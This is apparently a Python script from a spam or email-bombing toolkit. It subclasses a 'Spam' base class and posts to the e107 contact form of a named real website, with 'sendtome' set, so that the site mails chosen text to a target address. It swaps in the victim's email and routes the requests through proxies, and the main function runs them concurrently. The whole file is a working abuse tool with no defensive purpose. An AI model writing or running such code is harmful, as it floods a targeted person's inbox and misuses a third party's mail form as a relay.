from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        url = "http://amp-exchange.com/e107_plugins/contactform_menu/contactform.php?action=SendMail"
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "upgrade-insecure-requests": "1",
            "cookie": "e107_tzOffset=-120; e107_tdOffset=-1; e107_tdSetTime=1677060828",
            "Referer": "http://amp-exchange.com/e107_plugins/contactform_menu/contactform.php",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            'connection': 'keep-alive'

        }
        data = "frmaction=SendMail&id=2&name=test&email=wezxasqw%40gmail.com&subject=test&message=test&sendtome=Y&custom1=test&submit=Send+message&q=&r=0"
        data = data.replace('wezxasqw%40gmail.com', target).replace('test', self.get_text())

        response = requests.post(url, headers=headers, data=data.encode(), proxies=self.get_proxies())

        return response


def main():
    s = 'thank you'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
